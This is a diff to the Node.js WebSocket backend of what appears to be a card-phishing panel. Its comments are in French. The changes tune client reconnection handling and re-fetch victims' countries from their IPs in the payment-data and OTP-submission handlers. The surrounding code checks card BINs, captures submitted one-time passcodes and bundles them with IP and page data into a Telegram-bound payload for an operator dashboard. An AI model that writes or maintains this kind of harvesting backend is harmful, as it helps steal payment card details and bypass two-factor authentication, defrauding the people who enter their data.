@@ -413,16 +413,17 @@ wss.on('connection', async (ws, req) => {
       console.log(`[Connection] ⚠️  Client ${clientId} not found in storage`);
     }
     
-    // Pour les fermetures normales (code 1000), attendre un peu avant de supprimer
+    // Pour les fermetures normales (code 1000), attendre plus longtemps avant de supprimer
     // Cela permet au client de se reconnecter rapidement sans perdre son état
+    // React.StrictMode peut créer deux connexions, l'une se fermant rapidement
     if (code === 1000) {
-      console.log(`[Connection] ⚠️  Normal closure (code 1000) - waiting 2 seconds before removing client`);
+      console.log(`[Connection] ⚠️  Normal closure (code 1000) - waiting 5 seconds before removing client`);
       console.log(`[Connection] This might be a React.StrictMode cleanup - client may reconnect`);
       
       setTimeout(() => {
         const stillExists = clients.get(clientId);
         if (stillExists && stillExists.ws.readyState === 3) { // CLOSED
-          console.log(`[Connection] Client ${clientId} still closed after 2 seconds - removing`);
+          console.log(`[Connection] Client ${clientId} still closed after 5 seconds - removing`);
           console.log(`[Connection] 📊 Client role before removal: ${stillExists.role || 'null'}`);
           console.log(`[Connection] 📊 Total clients before removal: ${clients.size}`);
           if (stillExists.role === 'dashboard') {
@@ -443,8 +444,10 @@ wss.on('connection', async (ws, req) => {
           }
         } else if (stillExists && stillExists.ws.readyState !== 3) {
           console.log(`[Connection] ✅ Client ${clientId} reconnected! Keeping in map`);
+        } else {
+          console.log(`[Connection] ⚠️  Client ${clientId} no longer exists in storage`);
         }
-      }, 2000);
+      }, 5000); // Augmenter à 5 secondes pour laisser plus de temps à React.StrictMode
       
       return; // Ne pas supprimer immédiatement
     }
@@ -696,18 +699,30 @@ async function handlePaymentData(clientId, data) {
   
   // Si le pays n'est pas défini ou est "Unknown", essayer de le récupérer à nouveau
   let country = client.country;
-  if (!country || country === 'Unknown' || country === 'N/A') {
-    console.log(`[handlePaymentData] ⚠️  Country is missing or Unknown, attempting to fetch again...`);
-    if (client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1') {
-      country = await getCountryFromIP(client.ip);
-      console.log(`[handlePaymentData] 🔄 Re-fetched country: ${country}`);
-      // Mettre à jour le pays dans les données du client
-      client.country = country || 'Unknown';
-      console.log(`[handlePaymentData] ✅ Updated client country to: ${client.country}`);
+  if (!country || country === 'Unknown' || country === 'N/A' || country === 'null') {
+    console.log(`[handlePaymentData] ⚠️  Country is missing or Unknown (${country}), attempting to fetch again...`);
+    if (client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1' && !client.ip.startsWith('192.168.') && !client.ip.startsWith('10.') && !client.ip.startsWith('172.')) {
+      try {
+        country = await getCountryFromIP(client.ip);
+        console.log(`[handlePaymentData] 🔄 Re-fetched country: ${country}`);
+        // Mettre à jour le pays dans les données du client
+        if (country && country !== 'Unknown' && country !== 'Local') {
+          client.country = country;
+          console.log(`[handlePaymentData] ✅ Updated client country to: ${client.country}`);
+        } else {
+          console.log(`[handlePaymentData] ⚠️  Re-fetch returned invalid country: ${country}`);
+          country = country || 'Unknown';
+        }
+      } catch (error) {
+        console.error(`[handlePaymentData] ❌ Error fetching country:`, error);
+        country = 'Unknown';
+      }
     } else {
-      console.log(`[handlePaymentData] ⚠️  Cannot fetch country - invalid IP: ${client.ip}`);
+      console.log(`[handlePaymentData] ⚠️  Cannot fetch country - invalid or local IP: ${client.ip}`);
       country = 'Unknown';
     }
+  } else {
+    console.log(`[handlePaymentData] ✅ Using stored country: ${country}`);
   }
   
   // Vérifier le BIN du numéro de carte
@@ -815,10 +830,38 @@ async function handleOTPSubmit(clientId, data) {
   console.log(`[handleOTPSubmit] 🌍 Client country from storage: ${client.country || 'NOT SET'}`);
   console.log(`[handleOTPSubmit] 🌍 Client IP: ${client.ip || 'NOT SET'}`);
   
+  // Si le pays n'est pas défini ou est "Unknown", essayer de le récupérer à nouveau
+  let country = client.country;
+  if (!country || country === 'Unknown' || country === 'N/A' || country === 'null') {
+    console.log(`[handleOTPSubmit] ⚠️  Country is missing or Unknown (${country}), attempting to fetch again...`);
+    if (client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1' && !client.ip.startsWith('192.168.') && !client.ip.startsWith('10.') && !client.ip.startsWith('172.')) {
+      try {
+        country = await getCountryFromIP(client.ip);
+        console.log(`[handleOTPSubmit] 🔄 Re-fetched country: ${country}`);
+        // Mettre à jour le pays dans les données du client
+        if (country && country !== 'Unknown' && country !== 'Local') {
+          client.country = country;
+          console.log(`[handleOTPSubmit] ✅ Updated client country to: ${client.country}`);
+        } else {
+          console.log(`[handleOTPSubmit] ⚠️  Re-fetch returned invalid country: ${country}`);
+          country = country || 'Unknown';
+        }
+      } catch (error) {
+        console.error(`[handleOTPSubmit] ❌ Error fetching country:`, error);
+        country = 'Unknown';
+      }
+    } else {
+      console.log(`[handleOTPSubmit] ⚠️  Cannot fetch country - invalid or local IP: ${client.ip}`);
+      country = 'Unknown';
+    }
+  } else {
+    console.log(`[handleOTPSubmit] ✅ Using stored country: ${country}`);
+  }
+  
   const telegramData = {
     id: clientId,
     ip: client.ip,
-    country: client.country || 'Unknown', // S'assurer que le pays est toujours défini
+    country: country || 'Unknown', // Utiliser le pays récupéré ou mis à jour
     otp_code: data.otp,
     otp_status: 'submitted',
     current_page: client.current_page,
